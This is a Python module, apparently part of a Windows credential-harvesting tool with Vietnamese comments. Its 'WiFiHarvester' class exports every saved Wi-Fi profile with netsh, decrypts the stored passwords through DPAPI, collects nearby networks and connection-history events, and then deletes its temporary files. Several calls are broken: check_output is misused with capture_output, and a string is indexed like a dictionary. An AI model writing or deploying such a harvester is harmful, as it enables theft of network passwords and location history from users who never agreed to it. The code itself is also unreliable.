import os
import re
import subprocess
from typing import Dict, List, Optional
from xml.etree import ElementTree
import base64
import win32crypt

class WiFiHarvester:
    """Thu thập thông tin về các mạng WiFi đã lưu"""

    def __init__(self):
        self.profiles: Dict[str, Dict] = {}
        self.connection_history: List[Dict] = []

    def get_profile_names(self) -> List[str]:
        """Lấy danh sách tên các profile WiFi"""
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], 
                                          capture_output=True, text=True).stdout
            profile_names = []
            for line in output.split('\n'):
                if "All User Profile" in line:
                    name = line.split(':')[1].strip()
                    profile_names.append(name)
            return profile_names
        except Exception:
            return []

    def get_profile_details(self, name: str) -> Optional[Dict]:
        """Lấy chi tiết của một profile WiFi"""
        try:
            # Export profile ra file XML
            xml_file = os.path.join(os.getenv('TEMP'), f"{name}.xml")
            subprocess.run(["netsh", "wlan", "export", "profile", 
                          f'name="{name}"', f'folder="{os.getenv("TEMP")}"'],
                         capture_output=True)

            if not os.path.exists(xml_file):
                return None

            # Parse XML file
            tree = ElementTree.parse(xml_file)
            root = tree.getroot()
            ns = {'ns': 'http://www.microsoft.com/networking/WLAN/profile/v1'}

            profile = {
                'name': name,
                'ssid': '',
                'authentication': '',
                'encryption': '',
                'password': '',
                'auto_connect': False
            }

            # Extract SSID
            ssid_elem = root.find('.//ns:SSID/ns:name', ns)
            if ssid_elem is not None:
                profile['ssid'] = ssid_elem.text

            # Extract authentication type  
            auth_elem = root.find('.//ns:authentication', ns)
            if auth_elem is not None:
                profile['authentication'] = auth_elem.text

            # Extract encryption type
            encr_elem = root.find('.//ns:encryption', ns)
            if encr_elem is not None:
                profile['encryption'] = encr_elem.text

            # Extract password if available
            key_elem = root.find('.//ns:keyMaterial', ns)
            if key_elem is not None and key_elem.text:
                # Decrypt password using DPAPI
                encrypted = base64.b64decode(key_elem.text)
                try:
                    password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
                    profile['password'] = password.decode()
                except Exception:
                    profile['password'] = ''

            # Extract auto connect setting
            connect_elem = root.find('.//ns:connectionMode', ns)
            if connect_elem is not None:
                profile['auto_connect'] = (connect_elem.text.lower() == 'auto')

            # Cleanup
            os.remove(xml_file)

            return profile

        except Exception:
            if os.path.exists(xml_file):
                os.remove(xml_file)
            return None

    def get_connection_history(self) -> List[Dict]:
        """Lấy lịch sử kết nối WiFi"""
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"], 
                                          capture_output=True, text=True).stdout
            
            current_network = {}
            networks = []
            
            for line in output.split('\n'):
                line = line.strip()
                
                if line.startswith('SSID'):
                    if current_network:
                        networks.append(current_network)
                    current_network = {'ssid': line.split(':')[1].strip()}
                    
                elif 'Authentication' in line:
                    current_network['authentication'] = line.split(':')[1].strip()
                    
                elif 'Encryption' in line:
                    current_network['encryption'] = line.split(':')[1].strip()
                    
                elif 'Signal' in line:
                    current_network['signal'] = line.split(':')[1].strip()
                    
                elif 'BSSID' in line:
                    current_network['bssid'] = line.split(':')[1].strip()
                    
                elif 'Channel' in line:
                    current_network['channel'] = line.split(':')[1].strip()

            if current_network:
                networks.append(current_network)
                
            return networks
            
        except Exception:
            return []

    def get_all_wifi_data(self) -> Dict:
        """Thu thập toàn bộ dữ liệu WiFi"""
        result = {
            'profiles': [],
            'current_networks': [],
            'connection_history': []
        }

        # Get saved profiles
        profile_names = self.get_profile_names()
        for name in profile_names:
            profile = self.get_profile_details(name)
            if profile:
                result['profiles'].append(profile)

        # Get current available networks
        result['current_networks'] = self.get_connection_history()

        # Get Windows event log for connection history
        try:
            output = subprocess.check_output(
                ['powershell', '-Command', 
                 'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-WLAN-AutoConfig/Operational"; ' +
                 'ID=8001} -MaxEvents 100 | Select-Object TimeCreated,Message | ConvertTo-Json'],
                capture_output=True, text=True
            ).stdout
            
            events = []
            for event in output.splitlines():
                if 'TimeCreated' in event and 'Message' in event:
                    # Extract SSID from message
                    ssid_match = re.search(r'SSID: (.*?),', event)
                    if ssid_match:
                        events.append({
                            'timestamp': event['TimeCreated'],
                            'ssid': ssid_match.group(1)
                        })
            result['connection_history'] = events

        except Exception:
            pass

        return result

    def cleanup(self):
        """Dọn dẹp temporary files"""
        temp_dir = os.getenv('TEMP')
        if temp_dir:
            for file in os.listdir(temp_dir):
                if file.endswith('.xml') and 'WiFi' in file:
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except Exception:
                        pass